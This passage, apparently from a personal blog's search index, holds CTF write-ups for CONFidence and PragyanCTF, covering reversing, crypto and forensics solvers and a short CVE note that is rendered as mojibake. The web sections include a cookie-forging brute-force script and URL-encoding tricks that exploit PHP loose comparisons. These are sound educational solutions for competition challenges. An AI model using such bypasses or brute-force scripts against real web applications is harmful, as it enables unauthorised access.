08&#x27;], [&#x27; 00401DFE&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E01&#x27;, &#x27;&#x27;], [&#x27; 00401CE2&#x27;, &#x27;55&#x27;], [&#x27; 00401CE3&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401CE5&#x27;, &#x27;81 ec c0 00 00 00&#x27;], [&#x27; 00401CEB&#x27;, &#x27;c7 45 f0 4c a0 43 00&#x27;], [&#x27; 00401CF2&#x27;, &#x27;c7 45 fc 00 00 00 00&#x27;], [&#x27; 00401CF9&#x27;, &#x27;eb 29 8f a5 2e b7 d5 f8 1f 88 b5 74 1f 9f ef c5&#x27;], [&#x27; 00401D24&#x27;, &#x27;83 7d fc 1f&#x27;], [&#x27; 00401D28&#x27;, &#x27;&#x27;], [&#x27; 00401CFB&#x27;, &#x27;8b 45 fc&#x27;], [&#x27; 00401CFE&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401D01&#x27;, &#x27;89 94 85 6c ff ff ff&#x27;], [&#x27; 00401D08&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401D0B&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401D0E&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D10&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401D13&#x27;, &#x27;8d 8d 4c ff ff ff&#x27;], [&#x27; 00401D19&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401D1C&#x27;, &#x27;01 ca&#x27;], [&#x27; 00401D1E&#x27;, &#x27;88 02&#x27;], [&#x27; 00401D20&#x27;, &#x27;83 45 fc 01&#x27;], [&#x27; 00401D24&#x27;, &#x27;0f 0b a2 5d a0 45&#x27;], [&#x27; 00401D2A&#x27;, &#x27;c7 45 f8 00 00 00 00&#x27;], [&#x27; 00401D31&#x27;, &#x27;eb 6b 8f a5 32 a9 71 82 0d 23 e2 ff 42 c5 e5 78&#x27;], [&#x27; 00401D9E&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401DA1&#x27;, &#x27;8b 45 f0&#x27;], [&#x27; 00401DA4&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401DA6&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401DA9&#x27;, &#x27;84 c0&#x27;], [&#x27; 00401DAB&#x27;, &#x27;&#x27;], [&#x27; 00401D33&#x27;, &#x27;8b 45 f8&#x27;], [&#x27; 00401D36&#x27;, &#x27;99&#x27;], [&#x27; 00401D37&#x27;, &#x27;c1 ea 1b&#x27;], [&#x27; 00401D3A&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D3C&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D3F&#x27;, &#x27;29 d0&#x27;], [&#x27; 00401D41&#x27;, &#x27;8b 84 85 6c ff ff ff&#x27;], [&#x27; 00401D48&#x27;, &#x27;88 45 ef&#x27;], [&#x27; 00401D4B&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401D4E&#x27;, &#x27;8b 45 f0&#x27;], [&#x27; 00401D51&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D53&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401D56&#x27;, &#x27;0f b6 c0&#x27;], [&#x27; 00401D59&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D5C&#x27;, &#x27;89 c1&#x27;], [&#x27; 00401D5E&#x27;, &#x27;8b 45 f8&#x27;], [&#x27; 00401D61&#x27;, &#x27;99&#x27;], [&#x27; 00401D62&#x27;, &#x27;c1 ea 1b&#x27;], [&#x27; 00401D65&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D67&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D6A&#x27;, &#x27;29 d0&#x27;], [&#x27; 00401D6C&#x27;, &#x27;89 c2&#x27;], [&#x27; 00401D6E&#x27;, &#x27;8b 84 8d 6c ff ff ff&#x27;], [&#x27; 00401D75&#x27;, &#x27;89 84 95 6c ff ff ff&#x27;], [&#x27; 00401D7C&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401D7F&#x27;, &#x27;8b 45 f0&#x27;], [&#x27; 00401D82&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401D84&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401D87&#x27;, &#x27;0f b6 c0&#x27;], [&#x27; 00401D8A&#x27;, &#x27;83 e0 1f&#x27;], [&#x27; 00401D8D&#x27;, &#x27;89 c2&#x27;], [&#x27; 00401D8F&#x27;, &#x27;0f b6 45 ef&#x27;], [&#x27; 00401D93&#x27;, &#x27;89 84 95 6c ff ff ff&#x27;], [&#x27; 00401D9A&#x27;, &#x27;83 45 f8 01&#x27;], [&#x27; 00401D9E&#x27;, &#x27;0f 0b a6 93 d1 ae 1d 46 0f 60 9e 9a 56 a9 90&#x27;], [&#x27; 00401DAD&#x27;, &#x27;c7 45 f4 00 00 00 00&#x27;], [&#x27; 00401DB4&#x27;, &#x27;eb 20 8f a5 36 b7 a6 6f 9a 19 f5 63 9f 0f 9a c5&#x27;], [&#x27; 00401DD6&#x27;, &#x27;83 7d f4 1f&#x27;], [&#x27; 00401DDA&#x27;, &#x27;&#x27;], [&#x27; 00401DB6&#x27;, &#x27;8b 45 f4&#x27;], [&#x27; 00401DB9&#x27;, &#x27;8b 84 85 6c ff ff ff&#x27;], [&#x27; 00401DC0&#x27;, &#x27;8b 4d f4&#x27;], [&#x27; 00401DC3&#x27;, &#x27;8b 55 08&#x27;], [&#x27; 00401DC6&#x27;, &#x27;01 ca&#x27;], [&#x27; 00401DC8&#x27;, &#x27;0f b6 84 05 4c ff ff ff&#x27;], [&#x27; 00401DD0&#x27;, &#x27;88 02&#x27;], [&#x27; 00401DD2&#x27;, &#x27;83 45 f4 01&#x27;], [&#x27; 00401DD6&#x27;, &#x27;0f 0b aa 5d a0 3c&#x27;], [&#x27; 00401DDC&#x27;, &#x27;90&#x27;], [&#x27; 00401DDD&#x27;, &#x27;c9&#x27;], [&#x27; 00401DDE&#x27;, &#x27;c3 17 83 53 05 e4 f4 8f 5f 0e b9 52 46 b0 5c 5c&#x27;], [&#x27; 00401E06&#x27;, &#x27;90&#x27;], [&#x27; 00401E07&#x27;, &#x27;c9&#x27;], [&#x27; 00401E08&#x27;, &#x27;c3 17 83 53 05 e4 e4 53 5f 1a a0 52 24 78 a9 c3&#x27;], [&#x27; 00401E23&#x27;, &#x27;83 45 fc 01&#x27;], [&#x27; 00401E27&#x27;, &#x27;0f 0b a2 6d a0 2b&#x27;], [&#x27; 00401E2D&#x27;, &#x27;90&#x27;], [&#x27; 00401E2E&#x27;, &#x27;c9&#x27;], [&#x27; 00401E2F&#x27;, &#x27;c3 17 83 53 05 e4 d0 53 5f 22 f8 b2 e1 78 09 8d&#x27;], [&#x27; 00401E48&#x27;, &#x27;c7 44 24 08 20 00 00 00&#x27;], [&#x27; 00401E50&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401E53&#x27;, &#x27;89 44 24 04&#x27;], [&#x27; 00401E57&#x27;, &#x27;8b 45 f4&#x27;], [&#x27; 00401E5A&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E5D&#x27;, &#x27;e8 fa 4f 03 00 d5 23 ab 8a f4 d5 c1 45 2d 51 53&#x27;], [&#x27; 00436E5C&#x27;, &#x27;&#x27;], [&#x27; 00401E62&#x27;, &#x27;85 c0&#x27;], [&#x27; 00401E64&#x27;, &#x27;0f 94 c0&#x27;], [&#x27; 00401E67&#x27;, &#x27;c9&#x27;], [&#x27; 00401E68&#x27;, &#x27;c3 17 83 53 05 e4 b0 53 a0 f2 d4 b2 e1 78 ac 09&#x27;], [&#x27; 00401EA6&#x27;, &#x27;88 45 f7&#x27;], [&#x27; 00401EA9&#x27;, &#x27;80 7d f7 00&#x27;], [&#x27; 00401EAD&#x27;, &#x27;74 0e 8f a5 06 6c 85 6b 88 3c 29 b3 85 58 ff 3d&#x27;], [&#x27; 00401EBD&#x27;, &#x27;c7 04 24 80 a1 43 00&#x27;], [&#x27; 00401EC4&#x27;, &#x27;e8 7b 4f 03 00&#x27;], [&#x27; 00401EC9&#x27;, &#x27;b8 00 00 00 00&#x27;], [&#x27; 00401ECE&#x27;, &#x27;c9&#x27;], [&#x27; 00401ECF&#x27;, &#x27;c3 5d 01 07 bd 3d 46 4c 55 bd d8 4f cc 7a 76 83&#x27;]] go_patch(patch) Now we can understand the control flow of the encoded binary.Anyway, reverse the operation to get the flag flag.pydef de_shuffle( decode ): s = map(ord,list(&quot;I am tired of Earth, these people. I&#x27;m tired of being caught in the tangle of their lives.&quot;)) num = [] t =[] for i in range(32): num.append(i) t.append(decode[i]) for j in range(len(s)): temp = num[j%32] num[j%32] = num[s[j]&amp;0x1f] num[s[j]&amp;0x1f] = temp for k in range(32): t[num[k]] = decode[k] return tdef de_xor( decode ): s = map(ord,list(&quot;October 12th, 1985. Tonight, a comedian died in New York&quot;)) for i in range(32): decode[i] = decode[i]^s[i] return decodedef de_shift(decode): ret = [0]*len(decode) for i in range(len(decode)): num = decode[i] n_1 = num &gt;&gt; 4 n = num &amp; 0b1111 ret[i] |= n &lt;&lt; 4 ret[(i+1)%len(ret)] |= n_1 return retfinal = [232, 244, 218, 241, 21, 198, 184, 189, 119, 140, 193, 249, 116, 70, 120, 186, 209, 78, 188, 58, 243, 109, 169, 97, 68, 97, 101, 19, 109, 61, 206, 123]for i in range(16): final = de_shuffle(final) final = de_shift(final) final = de_xor(final) Web::My admin panelTL;DRSet the value of otadmin in cookie to &#123;&quot;hash&quot;: 389&#125; flag:p4&#123;wtf_php_comparisons_how_do_they_work&#125; source codelogin.php.bk&lt;?phpinclude &#x27;../func.php&#x27;;include &#x27;../config.php&#x27;;if (!$_COOKIE[&#x27;otadmin&#x27;]) &#123; exit(&quot;Not authenticated.\\n&quot;);&#125;if (!preg_match(&#x27;/^&#123;&quot;hash&quot;: [0-9A-Z\\&quot;]+&#125;$/&#x27;, $_COOKIE[&#x27;otadmin&#x27;])) &#123; echo &quot;COOKIE TAMPERING xD IM A SECURITY EXPERT\\n&quot;; exit();&#125;$session_data = json_decode($_COOKIE[&#x27;otadmin&#x27;], true);if ($session_data === NULL) &#123; echo &quot;COOKIE TAMPERING xD IM A SECURITY EXPERT\\n&quot;; exit(); &#125;if ($session_data[&#x27;hash&#x27;] != strtoupper(MD5($cfg_pass))) &#123; echo(&quot;I CAN EVEN GIVE YOU A HINT XD \\n&quot;); for ($i = 0; i &lt; strlen(MD5(&#x27;xDdddddd&#x27;)); i++) &#123; echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); &#125; // this if branch would print out &quot;I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400&quot; exit(&quot;\\n&quot;);&#125;display_admin(); detailsThe result of md5 (128-bit) would be represented as a sequence of 32 hexadecimal digits. So the meaning of hint is that 0 and 64 are the result of ord(digits)&amp;0xc0 and ord(letters)&amp;0xc0 respectively. Then, the $session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass)) is the key point, this is loose comparison. All we need to do is brute force the first three digits to pass this check. solve.pyimport requestsurl = &quot;https://gameserver.zajebistyc.tf/admin/login.php&quot;for i in range(100,1000): content = requests.get(url,cookies=&#123;&#x27;otadmin&#x27;:f&#x27;&#123;&#123;&quot;hash&quot;: &#123;i&#125;&#125;&#125;&#x27;&#125;).content if b&#x27;p4&#x27; in content: print(content,f&quot;hash = &#123;i&#125;&quot;) breakb&#x27;Congratulations! p4&#123;wtf_php_comparisons_how_do_they_work&#125;\\n&#x27; hash = 389 flagp4&#123;wtf_php_comparisons_how_do_they_work&#125; Crypto::Count me in!TL;DRThere is a bug inside the worker_function due to share a global variable among multiple workers, which causes that different workers use the same keystream to encrypt the plaintext. detailsThe bug is inside the worker_function. For example, in this scenario, the woker_0 is processing key_stream = aes.encrypt(pad(str(counter))), the counter is still 0, because the counter += 1 is not executed yet, what if the worker_1 is processing key_stream = aes.encrypt(pad(str(counter))) at the same time ? They are using the same keystream ! count.py...def worker_function(block): global counter key_stream = aes.encrypt(pad(str(counter))) result = xor_string(block, key_stream) counter += 1 return result... Find possible keys to decrypt flag: solver.pyfrom libnum import *import stringcipher = open(&quot;output.txt&quot;,&quot;r&quot;).read()cipher = [ cipher[i:i+32] for i in range(0,len(cipher),32)] ## slice cipher by a chunk size (16byte)plaintext = &quot;&quot;&quot;The Song of the CountYou know that I am called the CountBecause I really love to countI could sit and count all daySometimes I get carried awayI count slowly, slowly, slowly getting fasterOnce I&#x27;ve started counting it&#x27;s really hard to stopFaster, faster. It is so exciting!I could count forever, count until I drop1! 2! 3! 4!1-2-3-4, 1-2-3-4,1-2, i love couning whatever the ammount haha!1-2-3-4, heyyayayay heyayayay that&#x27;s the sound of the countI count the spiders on the wall...I count the cobwebs in the hall...I count the candles on the shelf...When I&#x27;m alone, I count myself!I count slowly, slowly, slowly getting fasterOnce I&#x27;ve started counting it&#x27;s really hard to stopFaster, faster. It is so exciting!I could count forever, count until I drop1! 2! 3! 4!1-2-3-4, 1-2-3-4, 1,2 I love counting whatever theammount! 1-2-3-4 heyayayay heayayay 1-2-3-4That&#x27;s the song of the Count!&quot;&quot;&quot;key = []for i in range(len(plaintext)/16): key.append(int(cipher[i],16)^s2n(plaintext[i*16:i*16+16]))unpad = lambda s : s if ord(s[-1]) &gt; 16 else s[0:-ord(s[-1])]flag = &quot;&quot;for i in range(len(plaintext)/16+1,len(cipher)): for j in key: s = unpad(n2s(int(cipher[i],16)^j)) if all( c in string.printable for c in s): flag += sprint flag# p4&#123;at_the_end_of_the_day_you_can_only_count_on_yourself&#125; Flag:p4&#123;at_the_end_of_the_day_you_can_only_count_on_yourself&#125; Misc","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"CONFidence","slug":"CONFidence","permalink":"http://blog.terrynini.tw/tags/CONFidence/"}]},{"title":"TIL::FaceBook_GIF_memory_exposure","slug":"TIL-FaceBook-GIF-memory-exposure","date":"2019-03-15T03:16:21.000Z","updated":"2019-03-15T06:12:57.000Z","comments":true,"path":"tw/TIL-FaceBook-GIF-memory-exposure/","permalink":"http://blog.terrynini.tw/tw/TIL-FaceBook-GIF-memory-exposure/","excerpt":"åŸæ–‡å»¶ä¼¸ 1GIF Palettes","text":"åŸæ–‡å»¶ä¼¸ 1GIF Palettes CVE-2017â€“15277åœ¨ ImageMagickï¼ˆ7.0.6â€“1ï¼‰å’Œ Graphicsmagickï¼ˆ1.3.26ï¼‰ï¼Œåœ¨è§£ææ™‚ï¼Œå¦‚æœ GIF ä¸­æ²’æœ‰å®šç¾©ä»»ä½•çš„ palettesï¼Œæœƒå› ç‚º palettes çš„è¨˜æ†¶é«”æ²’æœ‰é€²è¡Œä»»ä½•åˆå§‹åŒ–ï¼Œå°è‡´ä¸Šè‰²çš„æ™‚å€™ä½¿ç”¨æœ¬ä¾†è¨˜æ†¶é«”ä¸­æ®˜ç•™çš„è³‡æ–™é€ æˆè¨˜æ†¶é«”æ´©æ¼ã€‚ åŸå§‹ POC gifoeb åŸæ–‡ åŠ å»¶ä¼¸ 1 çš„ä½œè€…åˆ†åˆ¥åœ¨ Facebook Message åŠ HackerOne ä¸Šå˜—è©¦æˆåŠŸã€‚","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"FaceBook","slug":"FaceBook","permalink":"http://blog.terrynini.tw/tags/FaceBook/"},{"name":"GIF","slug":"GIF","permalink":"http://blog.terrynini.tw/tags/GIF/"}]},{"title":"2019::PragyanCTF","slug":"2019-PragyanCTF","date":"2019-03-11T17:08:23.000Z","updated":"2019-03-20T18:55:32.000Z","comments":true,"path":"en/2019-PragyanCTF/","permalink":"http://blog.terrynini.tw/en/2019-PragyanCTF/","excerpt":"Wanna try ghidra in reversing so I play Pragyan CTF.Did not have time to solve them all.Pragyan CTF is a much easier CTF, a good target for me to start writing my blogâ€¦â€¦Itâ€™s a good way to force me to understand every details and improve my English writing skill (maybe).","text":"Wanna try ghidra in reversing so I play Pragyan CTF.Did not have time to solve them all.Pragyan CTF is a much easier CTF, a good target for me to start writing my blogâ€¦â€¦Itâ€™s a good way to force me to understand every details and improve my English writing skill (maybe). WebCookie MonsterThe value of flag in cookie is the md5 result of flagâ€™s slices. bc54f4d60f1cec0f9a6cb70e13f2127a md5 pc114d6a415b3d04db792ca7c0da0c7a55 md5 tfb2984e12969ad3a3a2a4d334b8fb385a md5 &#123;c6f570c477ab64d17825ef2d2dfcb6fe4 md5 0o988287f7a1eb966ffc4e19bdbdeec7c3 md5 ki0d4896d431044c92de2840ed53b6fbbd md5 3sf355d719add62ceea8c150e5fbfae819 md5 _@12eccbdd9b32918131341f38907cbbb5 md5 re639307d281416ad0642faeaae1f098c4 md5 _y96bc320e4d72edda450c7a9abc8a214f md5 Umc716fb29298ad96a3b31757ec9755763 md5 _b51de5514f3c808babd19f42217fcba49 md5 Ut05cb7dc333ca611d0a8969704e39a9f0 md5 _tbc781c76baf5589eef4fb7b9247b89a0 md5 HEff108b961a844f859bd7c203b7366f8e md5 y_2349277280263dff980b0c8a4a10674b md5 @l0b1cdc9fe1f929e469c5a54ffe0b2ed5 md5 s0364641d04574146d9f88001e66b4410f md5 _rc758807125330006a4375357104f9a82 md5 3vfcfdc12fb4030a8c8a2e19cf7b075926 md5 Ea440c5c247c708c6e46783e47e3986889 md5 L_97a7bf81a216e803adfed8bd013f4b85 md5 @_c1d12de20210d8c1b35c367536e1c255 md5 l0a8655da06c5080d3f1eb6af7b514e309 md5 t&#125; flag:pctf&#123;c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t&#125; Game of FacesA form hidden behind the first color block, just upload any picture then you get a base64 encoded string which decoded as The_scroll_says=the_night_kingVSvalyrian.txt Get the flag at /the_night_kingVSvalyrian.txt flag:pctf&#123;You_L00K_Wi3Rd_IN_H3R3&#125; Mandatory PHPfinal solutionhttp://159.89.166.12:14000/?val2=WoAHh%2525252525252525252521&amp;val1=rUs&amp;val3=12&amp;val4=16 detail$a=hash(&quot;sha256&quot;,$a);$a=(log10($a**(0.5)))**2; Find a string whichâ€™s sha256 resultâ€™s prefix is 1e, so that it would be consider as scientific notation at first line. When $a=&#39;rUs&#39;, the result of sha256 is 1e40afafd2290d3f1e0cbc86cd9bbec0df8627b32730ea72e0dce67fe49a2f30, would be consider as $10^{40}$ at second line and the last result is 400, which is $12^2+16^2$, done. next check: for($i=1;$i&lt;=10;$i++)&#123; if($b==urldecode($b)) die(&#x27;duck&#x27;); else $b=urldecode($b);&#125;if($b===&quot;WoAHh!&quot;) It apply urldecode 10 times on $b, so we have to encode WoAHh! 10 times, also. The result should be WoAHh%25252525252525252521. But,the url would be decoded once by default, we have to do one more encode, which would be WoAHh%252525252525252525252521 flag:pctf&#123;b3_c4r3fu1_w1th_pHp_f31145&#125; ForensicsWelcomebinwalk -e welcome.jpegunzip d.zip The password for a.zip is in the secret.bmp, dGhlIHBhc3N3b3JkIGlzOiBoMzExMF90aDNyMyE==, decoded as the password is: h3110_th3r3!Then it give us a a.png, the flag is hidden in the white background flag:pctf&#123;st3gs0lv3_1s_u53ful&#125; Magic PNGsyou_cant_see_me.png is a broken png, fix it to get the password for tryme.zipFirst, fix the header , the header should be 8950 4e47 1d0a 1a0a instead of 8950 4e47 2e0a 2e0a.Next, find ascii string idat in png , this is the name of IDAT chunk, the string should be uppercase. Finally, fix two CRC checksums. then we get a picture of mask from movie V for Vendetta. According to the hint, the password for tryme.zip should be MD5 (&quot;h4CK3RM4n&quot;) = 2c919f82ee2ed6985d5c5e275d67e4f8 flag:pctf&#123;y0u_s33_m33_n0w!&#125; Save EarthSome usb packages, extract the Leftover Capture Data bytshark -r ./SaveEarth.pcap -T fields -e usb.capdata &gt; leftover.txt It doesnâ€™t look like some keyboard strike or mouse position, but more like morse code. leftover.txt01:02:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:04:00:00:00:00:00:0001:01:00:00:00:00:00:0001:02:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:04:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:01:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:04:00:00:00:00:00:0001:02:00:00:00:00:00:0001:02:00:00:00:00:00:00 Get morse code $ cut -d &#x27;:&#x27; -f 2 leftover.txt | sed -e &quot;s/01/ /g&quot; -e &#x27;s/02/-/g&#x27; -e &#x27;s/04/./g&#x27; | tr -d &#x27;\\n&#x27;-.-. - ..-. ... ....- ...- ...-- -.-. - ..-. ... ....- ...- ...-- -&gt; CTFS4V3 flag is in lowercase flag:ctf&#123;s4v3&#125; Slow RealizationIt gives us a flag.pdf and a jpeg picture The EOF of jpeg file format is ff d9, so there is actually a mp3 file concated behind this jpeg. Itâ€™s OneRepublic - Counting Stars, but there are some morse code and a weird woman voice. The morse code is not the password, which is .--. .- - .. . -. -.-. . .. ... - .... . -.- . -.-- .--. -.-. - ..-. -. ----- - .... ...-- .-. ...--PATIENCE IS THE KEY PCTF N0T H3R3 I thought that the password is inside the vocal between morse code. Tried to apply reverse, invert, or normalize individually on it, but I still can not get a clear version of the woman voice Luckily, I get the password by dictionary attackâ€¦., it turns out to be congratulations, WHAT ?It really sounds like that after I knew the real password is congratualtions,but it also sounds like slow realization?Can someone teach me how to get the password in right way? flag:pctf&#123;y0u_h34rd_m3_r1ght&#125; Late PRstrings it, doneIs this the intended solution ?? flag:pctf&#123;Late_submissions_can_be_good&#125; CryptographySpoilerThere are some additional information concated after the %%EOF of pdf %%EOF0000006a0000006f0000006e000000730000006e0000006f000000770000006900000073000000640000007200000061000000670000006f0000006e00000062000000790000006200000069000000720000007400000068 Itâ€™s a hex string 6a6f6e736e6f776973647261676f6e62796269727468, xor it with another hex string show in pdf. flag:PCTF&#123;JON_IS_TARGARYEN&#125; Add them Sneaky PolynomialsWe get some polynomials equations: p = x^406 + x^405 + x^402 + x^399 + x^397 + x^391 + x^390 + x^387 + x^386 + x^378 + x^374 + x^372 + x^371 + x^369 + x^367 + x^364 + x^360 + x^358 + x^357 + x^352 + x^350 + x^345 + x^344 + x^341 + x^336 + x^335 + x^334 + x^333 + x^331 + x^330 + x^329 + x^328 + x^327 + x^324 + x^322 + x^320 + x^314 + x^311 + x^308 + x^307 + x^303 + x^300 + x^299 + x^296 + x^295 + x^290 + x^289 + x^287 + x^279 + x^271 + x^266 + x^264 + x^262 + x^260 + x^257 + x^256 + x^252 + x^249 + x^248 + x^246 + x^243 + x^239 + x^238 + x^236 + x^233 + x^230 + x^227 + x^225 + x^223 + x^222 + x^220 + x^218 + x^216 + x^215 + x^209 + x^208 + x^207 + x^204 + x^202 + x^199 + x^190 + x^189 + x^185 + x^184 + x^180 + x^177 + x^176 + x^175 + x^172 + x^167 + x^166 + x^162 + x^160 + x^159 + x^155 + x^154 + x^149 + x^147 + x^143 + x^137 + x^135 + x^131 + x^129 + x^126 + x^124 + x^122 + x^116 + x^110 + x^108 + x^105 + x^104 + x^100 + x^99 + x^97 + x^94 + x^93 + x^90 + x^88 + x^87 + x^86 + x^85 + x^83 + x^75 + x^73 + x^69 + x^63 + x^62 + x^57 + x^54 + x^51 + x^44 + x^41 + x^38 + x^37 + x^36 + x^34 + x^29 + x^28 + x^26 + x^25 + x^21 + x^20 + x^19 + x^16 + x^15 + x^14 + x^13 + x^6 + x^5 + x^2q = x^399 + x^398 + x^396 + x^393 + x^392 + x^391 + x^388 + x^386 + x^384 + x^381 + x^377 + x^376 + x^368 + x^364 + x^360 + x^355 + x^354 + x^353 + x^352 + x^348 + x^346 + x^345 + x^344 + x^343 + x^335 + x^334 + x^329 + x^326 + x^325 + x^321 + x^318 + x^317 + x^315 + x^314 + x^311 + x^307 + x^306 + x^304 + x^300 + x^296 + x^293 + x^291 + x^282 + x^277 + x^270 + x^263 + x^261 + x^260 + x^256 + x^254 + x^253 + x^252 + x^251 + x^248 + x^245 + x^242 + x^241 + x^239 + x^238 + x^236 + x^232 + x^226 + x^225 + x^222 + x^220 + x^219 + x^214 + x^209 + x^208 + x^207 + x^206 + x^202 + x^200 + x^196 + x^191 + x^190 + x^186 + x^181 + x^180 + x^178 + x^177 + x^169 + x^168 + x^165 + x^164 + x^163 + x^162 + x^161 + x^159 + x^157 + x^156 + x^151 + x^149 + x^148 + x^147 + x^146 + x^144 + x^141 + x^140 + x^138 + x^137 + x^136 + x^134 + x^133 + x^132 + x^130 + x^129 + x^128 + x^126 + x^123 + x^121 + x^113 + x^109 + x^103 + x^101 + x^100 + x^95 + x^93 + x^91 + x^85 + x^84 + x^81 + x^74 + x^73 + x^71 + x^68 + x^67 + x^54 + x^52 + x^51 + x^50 + x^48 + x^46 + x^45 + x^43 + x^39 + x^35 + x^32 + x^31 + x^30 + x^29 + x^21 + x^15 + x^14 + x^9 + x^8 + x^5 + x^4 + x^2 + 1r = x^404 + x^402 + x^396 + x^389 + x^387 + x^386 + x^384 + x^382 + x^376 + x^373 + x^367 + x^366 + x^365 + x^362 + x^361 + x^358 + x^356 + x^355 + x^354 + x^353 + x^352 + x^349 + x^348 + x^347 + x^345 + x^343 + x^340 + x^334 + x^332 + x^331 + x^328 + x^327 + x^326 + x^322 + x^317 + x^316 + x^314 + x^313 + x^312 + x^310 + x^309 + x^308 + x^305 + x^304 + x^303 + x^301 + x^300 + x^299 + x^296 + x^295 + x^292 + x^291 + x^290 + x^288 + x^287 + x^286 + x^285 + x^283 + x^279 + x^278 + x^274 + x^271 + x^269 + x^268 + x^266 + x^265 + x^263 + x^261 + x^260 + x^259 + x^258 + x^256 + x^254 + x^252 + x^251 + x^250 + x^249 + x^244 + x^243 + x^242 + x^237 + x^236 + x^228 + x^225 + x^224 + x^223 + x^222 + x^221 + x^215 + x^214 + x^213 + x^212 + x^205 + x^201 + x^200 + x^199 + x^197 + x^193 + x^192 + x^191 + x^190 + x^189 + x^188 + x^187 + x^182 + x^180 + x^175 + x^174 + x^173 + x^167 + x^166 + x^163 + x^158 + x^156 + x^155 + x^153 + x^151 + x^150 + x^149 + x^143 + x^142 + x^140 + x^139 + x^136 + x^135 + x^133 + x^129 + x^126 + x^125 + x^123 + x^121 + x^118 + x^117 + x^116 + x^115 + x^113 + x^110 + x^106 + x^105 + x^104 + x^103 + x^102 + x^98 + x^95 + x^92 + x^89 + x^87 + x^85 + x^81 + x^80 + x^77 + x^76 + x^75 + x^74 + x^71 + x^70 + x^67 + x^66 + x^64 + x^63 + x^60 + x^59 + x^58 + x^56 + x^54 + x^53 + x^48 + x^44 + x^41 + x^39 + x^38 + x^35 + x^34 + x^31 + x^29 + x^28 + x^27 + x^22 + x^21 + x^20 + x^17 + x^14 + x^12 + x^11 + x^10 + x^9 + x^6 + x^4 + x^3 + x + 1 According to challengeâ€™s description, we can extract a string from these equations Obviously, if we plug x=2 into equations we can get some â€œbinary stringsâ€.For example, $2^5+2^4+2^2+2^1+1 &#x3D; 110111_{2} &#x3D; 55$, that is the ascii code for 7.After evaluation, we get some meaningless strings.But once we xor them together, the flag shows up flag:pctf&#123;f1n1t3_f13lds_4r3_m0r3_us3ful_th4n_y0u_th1nk&#125; The Order of the PhoenixAfter google the hint Eleven scientists are working on a secret project.......?, itâ€™s a challenge about Shamirâ€™s Secret Sharing. Read the content of QRcode first 1-d301da5536a5d8b8e2be50a7584127eb3704025f048cf72335f1b301b852b30a2-e1af01e2f7887b63c068823cbcd812f91899678656456db71dfa9ab1fbb1bd263-dc60d55a411ccfd4a44e6a9799774dd6207dffdfcab4b442075ead165fa7ecb4-510c9c8f6aaacebf16bb5fd9e2cd8c0845ec483bd49bf57fa4151e5b672c73b05-bd4f58a846bb9e47a7402e22df13002aef3bf3048011674269eaff39154c62bf6-7c61f3ee00ab759a6853f041e74ae2378144a96b662230888d6ba6412c6461907-d01f29e42de0ab1fb183a35d06a2ac6117acaad2b3017671846c7b380e83d6bb8-1268bf4430c0b1a4c568a302da92421bc672aceb57fef3401f2434cfc3bf740b9-b52781fd38b0185bd1a8a92a92dbf01c99eddbb50b86f65a882ad8a7fa313e9da-424b493442128adbeef5ce33f18c6c5996cdd97e4922644a4479bb4e05f8846f Guess the hexadecimal digits split by - are x and y on the x-y plane, then â€¦.We have to sovle an equation which derives from these coordinates by Lagrange polynomial. I didâ€™t decrypt it on my own implementation, the problems is that I used the wrong the prime. Using a github repo call secret-sharing to help me. plain text:pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125;\\n flag:pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125; reference Help RabinItâ€™s Rabin cryptosystem, which needs the factor p, q of n to do the decryption. The problem in here is that it generates n by mutiple two primes which are close to each other, this makes us are able to factor n by brute force. brute.pyfrom decimal import *from Crypto.PublicKey import RSAkey = RSA.importKey(open(&quot;./publickey.pem&quot;).read())getcontext().prec = 200n = Decimal(key.n)p = n.sqrt()while n % p != 0: p += 1q = n/p(p,q) = (int(p),int(q)) Then follow the steps on wiki, we can get the 